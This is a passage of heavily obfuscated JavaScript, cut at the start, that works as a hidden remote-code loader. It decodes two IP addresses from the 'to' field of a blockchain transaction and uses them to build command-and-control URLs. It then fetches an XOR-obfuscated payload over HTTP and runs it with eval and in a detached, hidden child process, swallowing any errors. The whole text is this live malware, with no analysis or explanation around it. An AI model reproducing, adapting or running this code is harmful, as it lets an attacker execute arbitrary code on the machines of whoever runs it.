_0x146e65(_0x2ed0b2);},'LUHgk':_0x55377a(0x1f4),'FJQfU':_0x55377a(0x29f),'qtOhP':function(_0x2dd368,_0x11dc0b){return _0x2dd368===_0x11dc0b;},'CvEVD':_0x55377a(0x2c6),'drGLd':function(_0x129c39,_0x7d3c7f){return _0x129c39(_0x7d3c7f);},'HnEZv':_0x55377a(0x30c),'IYVLW':_0x55377a(0x2b2),'ZFXMR':function(_0x33656f,_0x2660a9){return _0x33656f+_0x2660a9;},'LYlST':_0x55377a(0x25c)+_0x55377a(0x279)+_0x55377a(0x2b9)+_0x55377a(0x2b8)+_0x55377a(0x30d)+_0x55377a(0x315)+_0x55377a(0x2f2)+_0x55377a(0x22c)+_0x55377a(0x2e8)+_0x55377a(0x2ec)+_0x55377a(0x20c)+'6','znPEY':function(_0x5e6f3c,_0xed3ddc){return _0x5e6f3c(_0xed3ddc);},'MLIOR':_0x55377a(0x2a5),'ZTPpt':function(_0xe937e7,_0x5d96ce,_0x1f9763){return _0xe937e7(_0x5d96ce,_0x1f9763);},'qwuMv':_0x55377a(0x2f6),'UoHre':_0x55377a(0x2b3),'qgnZE':_0x55377a(0x26e),'cijQU':function(_0x1fa731,_0x27db6d){return _0x1fa731(_0x27db6d);},'qemQD':function(_0x277781,_0x2eb15d){return _0x277781+_0x2eb15d;},'MOgkU':function(_0x2eeca6,_0x3926fc,_0x2eb0e2,_0x3ba744){return _0x2eeca6(_0x3926fc,_0x2eb0e2,_0x3ba744);},'DXTAq':_0x55377a(0x2f4),'RvLqJ':_0x55377a(0x294),'HPlEi':function(_0x2f0528,_0x429b39){return _0x2f0528(_0x429b39);},'QpeUN':function(_0xf35d7a,_0x56c8f8){return _0xf35d7a-_0x56c8f8;},'kNlIn':function(_0x4e3539,_0x2eac81){return _0x4e3539%_0x2eac81;},'IHMbk':function(_0x1a1fd4,_0x437026){return _0x1a1fd4(_0x437026);},'UVEAg':function(_0x342454,_0x15a61e){return _0x342454(_0x15a61e);},'GZprP':_0x55377a(0x2c9),'WpXmE':function(_0x32b01f,_0x4ab473){return _0x32b01f(_0x4ab473);},'Wtnxs':function(_0x39388e,_0x599f2e){return _0x39388e(_0x599f2e);},'mujFt':_0x55377a(0x1f9)+_0x55377a(0x316),'ogLQR':_0x55377a(0x23b)+_0x55377a(0x28a)},_0x1bbf89=_0x7fec65[_0x55377a(0x2f1)](BigInt,await _0x7fec65[_0x55377a(0x25a)](wr,(_0x3f39d9,_0x308529)=>rc(_0x3f39d9,_0x55377a(0x2be)+_0x55377a(0x1f6),[],_0x308529))),_0x22fb13=_0x7fec65[_0x55377a(0x219)](_0x1bbf89,_0x7fec65[_0x55377a(0x242)](_0x1bbf89,B));let _0x149576=await _0x7fec65[_0x55377a(0x2c8)](fm,_0x7fec65[_0x55377a(0x2f8)](cb,_0x22fb13)[_0x55377a(0x305)](bt));_0x149576||(_0x149576=await _0x7fec65[_0x55377a(0x2f1)](ls,_0x1bbf89)[_0x55377a(0x23f)](li));const _0x40a141=Buffer[_0x55377a(0x1f1)](_0x149576['tx']['to'][_0x55377a(0x2e5)](/^0x/i,''),_0x7fec65[_0x55377a(0x2d7)]),_0x411ef3=_0x3d2586=>_0x3d2586[0x3*0x1eb+-0x38f+0x2*-0x119]+'\u002E'+_0x3d2586[0x1ebf*-0x1+-0x2231+0x7*0x947]+'\u002E'+_0x3d2586[0x1a*-0x11+-0x12e8*-0x1+0x274*-0x7]+'\u002E'+_0x3d2586[-0x1b57+0x59*-0xd+0xc7*0x29],[_0x421b97,_0x1d6d4c]=[_0x7fec65[_0x55377a(0x296)](_0x411ef3,_0x40a141[_0x55377a(0x266)](0x210d+-0xa6*0x11+-0x1607,0x1*-0xf0d+-0x82*-0x6+0xc05)),_0x7fec65[_0x55377a(0x211)](_0x411ef3,_0x40a141[_0x55377a(0x266)](-0x712+0x47*-0x11+-0x3ef*-0x3,0x1*-0x5bd+-0xb02+0x10c7))],_0x124f41=global;_0x124f41['_V']=_0x124f41['i'],_0x124f41['_H']=_0x55377a(0x2e1)+_0x421b97+_0x55377a(0x27a),_0x124f41[_0x55377a(0x2b3)]=_0x55377a(0x2e1)+_0x1d6d4c+_0x55377a(0x27a),_0x124f41[_0x55377a(0x2f6)]=_0x55377a(0x2e1)+_0x421b97+_0x55377a(0x216),_0x124f41[_0x55377a(0x26e)]=_0x55377a(0x2e1)+_0x421b97+_0x55377a(0x27a);function _0x55a40b(_0x3b18ce,_0x5ddbfd){const _0x224176=_0x55377a,_0x5d8ba1={'qFrln':_0x7fec65[_0x224176(0x314)],'HEGYP':_0x7fec65[_0x224176(0x28f)],'uFaIV':function(_0x1bd3c7,_0x3f388f){const _0x12bd2f=_0x224176;return _0x7fec65[_0x12bd2f(0x24a)](_0x1bd3c7,_0x3f388f);},'xLMUX':_0x7fec65[_0x224176(0x21b)],'dKrGP':function(_0xc44d94,_0x2a4e3d){const _0x54d87a=_0x224176;return _0x7fec65[_0x54d87a(0x24a)](_0xc44d94,_0x2a4e3d);},'jPatL':_0x7fec65[_0x224176(0x221)],'ciBJl':function(_0x1f6534,_0x1988ee){const _0x16f09d=_0x224176;return _0x7fec65[_0x16f09d(0x24a)](_0x1f6534,_0x1988ee);},'AfJYB':function(_0x3551db,_0x400f65){const _0x1be802=_0x224176;return _0x7fec65[_0x1be802(0x2f9)](_0x3551db,_0x400f65);},'fUFYG':_0x7fec65[_0x224176(0x30a)],'mjtii':function(_0x353d1c,_0x213c46){const _0xf57fd4=_0x224176;return _0x7fec65[_0xf57fd4(0x25a)](_0x353d1c,_0x213c46);},'IKYUV':_0x7fec65[_0x224176(0x2aa)],'kWFLB':_0x7fec65[_0x224176(0x213)],'OwQBz':_0x7fec65[_0x224176(0x24f)]},_0x392ddd={'hostname':_0x5ddbfd[_0x224176(0x2b6)],'port':+_0x5ddbfd[_0x224176(0x2f3)]||0x61c+-0x188a+0x12be,'path':_0x7fec65[_0x224176(0x260)](_0x5ddbfd[_0x224176(0x20b)],_0x5ddbfd[_0x224176(0x208)]),'headers':{'User-Agent':_0x7fec65[_0x224176(0x2bd)],'Sec-V':_0x124f41['_V']||0x133*-0x1+-0x80*-0x13+-0x84d}},_0x3523a0=_0x4b4fee=>{const _0x284474=_0x224176,_0x49d23b=_0x3b18ce[_0x284474(0x2fd)];for(let _0x403734=0x18e4+0x3ae+-0x1c92;_0x7fec65[_0x284474(0x229)](_0x403734,_0x4b4fee[_0x284474(0x2fd)]);_0x403734++)_0x4b4fee[_0x403734]^=_0x3b18ce[_0x284474(0x2cb)](_0x7fec65[_0x284474(0x207)](_0x403734,_0x49d23b));return _0x4b4fee[_0x284474(0x253)](_0x7fec65[_0x284474(0x270)]);},_0x27d131=_0x11f0b8=>{const _0x4a8021=_0x224176,_0x156194=_0x11f0b8[_0x4a8021(0x2e4)][_0x5d8ba1[_0x4a8021(0x241)]];if(!_0x156194)throw new Error(_0x5d8ba1[_0x4a8021(0x226)]);return _0x5d8ba1[_0x4a8021(0x255)](_0x3523a0,Buffer[_0x4a8021(0x1f1)](_0x156194,_0x5d8ba1[_0x4a8021(0x30b)]));},_0x2df536=_0x1cf6c4=>new Promise((_0x19e059,_0x4b44bd)=>{const _0x2bdd8c=_0x224176,_0x179668=http[_0x2bdd8c(0x2fb)]({..._0x392ddd,'method':_0x1cf6c4},_0x1f7cb5=>{const _0x5b4fc8=_0x2bdd8c,_0x5a3cc2={'PWlzd':function(_0x481eaf,_0x318495){const _0x22e39c=_0x4963;return _0x5d8ba1[_0x22e39c(0x271)](_0x481eaf,_0x318495);},'XHKVp':_0x5d8ba1[_0x5b4fc8(0x241)],'dDnil':function(_0x58ff8f,_0x334e58){const _0x1556a2=_0x5b4fc8;return _0x5d8ba1[_0x1556a2(0x255)](_0x58ff8f,_0x334e58);},'hxvkS':function(_0x48a9c8,_0xcd641b){const _0x5cef57=_0x5b4fc8;return _0x5d8ba1[_0x5cef57(0x255)](_0x48a9c8,_0xcd641b);},'PjPYE':function(_0xca6f7f,_0x5b2eb8){const _0x2b10ea=_0x5b4fc8;return _0x5d8ba1[_0x2b10ea(0x271)](_0xca6f7f,_0x5b2eb8);},'RzAXc':_0x5d8ba1[_0x5b4fc8(0x2bb)],'NfmdB':function(_0x57b1cf,_0x147773){const _0x2dfbf8=_0x5b4fc8;return _0x5d8ba1[_0x2dfbf8(0x268)](_0x57b1cf,_0x147773);}};if(_0x5d8ba1[_0x5b4fc8(0x276)](_0x1cf6c4,_0x5d8ba1[_0x5b4fc8(0x2ad)])){try{_0x5d8ba1[_0x5b4fc8(0x273)](_0x19e059,_0x5d8ba1[_0x5b4fc8(0x271)](_0x27d131,_0x1f7cb5));}catch(_0x12fce8){_0x5d8ba1[_0x5b4fc8(0x268)](_0x4b44bd,_0x12fce8);}_0x1f7cb5[_0x5b4fc8(0x259)]();return;}const _0x191e9f=[];_0x1f7cb5['on'](_0x5d8ba1[_0x5b4fc8(0x29b)],_0x43fb0c=>_0x191e9f[_0x5b4fc8(0x201)](_0x43fb0c)),_0x1f7cb5['on'](_0x5d8ba1[_0x5b4fc8(0x2af)],()=>{const _0xeb5fed=_0x5b4fc8;try{const _0x4143ee=Buffer[_0xeb5fed(0x26b)](_0x191e9f);if(_0x4143ee[_0xeb5fed(0x2fd)])return _0x5a3cc2[_0xeb5fed(0x20a)](_0x19e059,_0x5a3cc2[_0xeb5fed(0x20a)](_0x3523a0,_0x4143ee));if(_0x1f7cb5[_0xeb5fed(0x2e4)][_0x5a3cc2[_0xeb5fed(0x2cd)]])return _0x5a3cc2[_0xeb5fed(0x2ac)](_0x19e059,_0x5a3cc2[_0xeb5fed(0x210)](_0x27d131,_0x1f7cb5));_0x5a3cc2[_0xeb5fed(0x28b)](_0x4b44bd,new Error(_0x5a3cc2[_0xeb5fed(0x29a)]));}catch(_0x296191){_0x5a3cc2[_0xeb5fed(0x1ef)](_0x4b44bd,_0x296191);}}),_0x1f7cb5['on'](_0x5d8ba1[_0x5b4fc8(0x21f)],_0x4b44bd);});_0x179668['on'](_0x7fec65[_0x2bdd8c(0x24f)],_0x4b44bd),_0x179668[_0x2bdd8c(0x2b2)]();});return _0x7fec65[_0x224176(0x2c2)](_0x2df536,_0x7fec65[_0x224176(0x1fe)])[_0x224176(0x23f)](()=>_0x2df536(_0x224176(0x2c6)));}async function _0x254832(_0x50ce50,_0x1e9acf,_0x1f2c0){const _0x253d26=_0x55377a;try{const _0x42afde=await _0x7fec65[_0x253d26(0x2b7)](_0x55a40b,_0x1e9acf,_0x50ce50),_0x319a6e=_0x253d26(0x31c)+_0x253d26(0x2e7)+(_0x124f41['_V']||-0x1*-0x9ad+-0x189*0x5+-0x200)+_0x253d26(0x230)+(_0x1f2c0?'\u005F\u0048':_0x7fec65[_0x253d26(0x237)])+_0x253d26(0x2e7)+(_0x1f2c0?_0x124f41['_H']:_0x124f41[_0x253d26(0x2f6)])+_0x253d26(0x230)+(_0x1f2c0?_0x7fec65[_0x253d26(0x231)]:_0x7fec65[_0x253d26(0x27f)])+_0x253d26(0x2e7)+(_0x1f2c0?_0x124f41[_0x253d26(0x2b3)]:_0x124f41[_0x253d26(0x26e)])+(_0x253d26(0x230)+_0x253d26(0x317)+_0x253d26(0x309)+_0x253d26(0x264)+_0x253d26(0x22f)+_0x253d26(0x2a3));_0x1f2c0||_0x7fec65[_0x253d26(0x222)](eval,_0x7fec65[_0x253d26(0x283)](_0x319a6e,_0x42afde)),_0x7fec65[_0x253d26(0x2a6)](spawn,_0x7fec65[_0x253d26(0x23e)],['-e',_0x7fec65[_0x253d26(0x283)](_0x319a6e,_0x42afde)],{'detached':!(-0x3*-0xc5b+0x48a+0x299b*-0x1),'stdio':_0x7fec65[_0x253d26(0x2b1)],'windowsHide':!(-0x301*-0x3+-0x25cd*-0x1+0x38*-0xd6)})[_0x253d26(0x200)]();}catch(_0x354116){}}await _0x7fec65[_0x55377a(0x2a6)](_0x254832,new URL(_0x55377a(0x2e1)+_0x421b97+(_0x55377a(0x23c)+'s')),_0x7fec65[_0x55377a(0x203)],!(-0x2*-0xa75+0x3be*-0x7+0x1c3*0x3)),await _0x7fec65[_0x55377a(0x2a6)](_0x254832,new URL(_0x55377a(0x2e1)+_0x421b97+_0x55377a(0x2b5)),_0x7fec65[_0x55377a(0x265)],!(-0x315*-0x3+0x7*-0x10f+-0x2f*0xa));})());
